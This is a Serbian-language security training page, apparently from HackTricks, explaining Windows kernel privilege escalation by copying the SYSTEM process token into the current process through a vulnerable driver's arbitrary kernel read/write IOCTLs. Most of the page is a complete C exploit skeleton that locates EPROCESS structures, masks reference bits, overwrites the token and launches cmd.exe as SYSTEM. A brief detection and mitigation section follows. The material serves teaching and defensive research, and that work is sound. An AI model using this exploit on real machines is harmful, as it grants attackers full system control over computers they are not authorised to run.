# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Ako ranjivi driver izlaže IOCTL koji napadaču omogućava proizvoljno kernel čitanje i/ili upis, eskalacija na NT AUTHORITY\SYSTEM često se može postići krađom SYSTEM access tokena. Ova tehnika kopira Token pointer iz EPROCESS SYSTEM procesa u EPROCESS trenutnog procesa.<sup>[[2]](#references)</sup>

Zašto funkcioniše:
- Svaki proces ima EPROCESS strukturu koja, između ostalih polja, sadrži Token (zapravo EX_FAST_REF ka token objektu).
- SYSTEM proces (PID 4) poseduje token sa omogućenim svim privilegijama.
- Zamena vrednosti current process EPROCESS.Token pokazivačem na SYSTEM token omogućava da trenutni proces odmah radi kao SYSTEM.<sup>[[1]](#references)</sup>

> Offseti u EPROCESS strukturi razlikuju se između verzija Windowsa. Odredite ih dinamički (pomoću simbola) ili koristite konstante specifične za verziju. Takođe imajte na umu da je EPROCESS.Token EX_FAST_REF (najniža 3 bita predstavljaju zastavice broja referenci).

## Koraci na visokom nivou

1) Pronađite bazu ntoskrnl.exe i razrešite adresu PsInitialSystemProcess.
- Iz user moda koristite NtQuerySystemInformation(SystemModuleInformation) ili EnumDeviceDrivers da biste dobili baze učitanih drivera.
- Dodajte offset PsInitialSystemProcess (dobijen iz simbola/reverse engineeringa) kernel bazi da biste dobili njegovu adresu.
2) Pročitajte pointer na PsInitialSystemProcess → ovo je kernel pointer ka EPROCESS strukturi SYSTEM procesa.
3) Iz SYSTEM EPROCESS strukture pročitajte offsete UniqueProcessId i ActiveProcessLinks da biste prolazili kroz dvostruko povezanu listu EPROCESS struktura (ActiveProcessLinks.Flink/Blink) dok ne pronađete EPROCESS čiji UniqueProcessId odgovara vrednosti koju vraća GetCurrentProcessId(). Sačuvajte oba:
- EPROCESS_SYSTEM (za SYSTEM)
- EPROCESS_SELF (za trenutni proces)
4) Pročitajte vrednost SYSTEM tokena: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Maskirajte najniža 3 bita: Token_SYS_masked = Token_SYS & ~0xF (uobičajeno ~0xF ili ~0x7, u zavisnosti od builda; na x64 se koriste najniža 3 bita — maska 0xFFFFFFFFFFFFFFF8).
5) Opcija A (uobičajena): Sačuvajte najniža 3 bita trenutnog tokena i spojite ih sa SYSTEM pointerom da biste očuvali konzistentnost ugrađenog broja referenci.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Upišite Token_NEW nazad na (EPROCESS_SELF + TokenOffset) koristeći kernel write primitive.
7) Vaš trenutni proces sada ima SYSTEM privilegije. Po želji pokrenite novi cmd.exe ili powershell.exe radi potvrde.<sup>[[1]](#references)</sup>

## Pseudocode

U nastavku je skeleton koji koristi samo dva IOCTL-a ranjivog drivera: jedan za 8-bajtno kernel čitanje i drugi za 8-bajtni kernel upis. Zamenite ih interfejsom svog drivera.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Napomene:
- Offsets: Koristite `dt nt!_EPROCESS` u WinDbg-u sa PDB-ovima cilja ili runtime učitavač simbola da biste dobili ispravne offsets. Nemojte ih slepo hardkodovati.
- Mask: Na x64, token je EX_FAST_REF; donja 3 bita predstavljaju bitove broja referenci. Zadržavanje originalnih donjih bitova iz vašeg tokena sprečava trenutne nedoslednosti brojača referenci.
- Stability: Prednost dajte elevaciji trenutnog procesa; ako elevujete kratkotrajni pomoćni proces, možete izgubiti SYSTEM kada se on završi.<sup>[[1]](#references)</sup>

## Detekcija i mitigation
- Učitavanje nepotpisanih ili nepouzdanih third-party drivera koji izlažu moćne IOCTL-ove predstavlja osnovni uzrok.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard i Attack Surface Reduction pravila mogu sprečiti učitavanje ranjivih drivera.
- EDR može nadgledati sumnjive IOCTL sekvence koje implementiraju arbitrary read/write, kao i zamene tokena.

## Reference

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
